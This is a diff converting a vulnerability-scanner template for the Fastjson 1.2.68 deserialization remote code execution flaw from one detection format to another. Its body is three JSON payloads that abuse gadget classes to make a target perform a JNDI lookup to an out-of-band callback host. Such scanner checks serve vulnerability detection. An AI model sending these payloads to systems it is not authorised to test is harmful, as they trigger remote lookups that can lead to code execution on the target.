@@ -1,57 +1,51 @@
 id: fastjson-1-2-68-rce
+
 info:
-  name: Fastjson 1.2.68 - Remote Code Execution
+  name: Fastjson 1.2.68 Deserialization RCE
   author: zh
   severity: critical
-  description: |
-    Fastjson 1.2.68 is susceptible to a deserialization remote code execution vulnerability.
   reference:
     - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
     - https://github.com/wyzxxz/fastjson_rce_tool
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
-    cwe-id: CWE-77
-  tags: fastjson,rce,deserialization,oast
-requests:
-  - raw:
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
 
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
         {
            "@type":"org.apache.shiro.jndi.JndiObjectFactory",
-           "resourceName":"rmi://{{interactsh-url}}/Exploit"
+           "resourceName":"rmi://{{reverseURL}}/Exploit"
         }
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
+    expression: response.status == 200 && reverse.wait(5)
+  r1:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
         {
            "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
-           "jndiNames":"rmi://{{interactsh-url}}/Exploit"
+           "jndiNames":"rmi://{{reverseURL}}/Exploit"
         }
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
+    expression: response.status == 200 && reverse.wait(5)
+  r2:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
         {
            "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
-           "metricRegistry":"rmi:/{{interactsh-url}}/Exploit"
+           "metricRegistry":"rmi:/{{reverseURL}}/Exploit"
         }
-    stop-at-first-match: true
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms DNS Interaction
-        words:
-          - "dns"
-      - type: status
-        negative: true
-        status:
-          - 200
-
-# Enhanced by mp on 2022/05/25
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0() || r1() || r2()
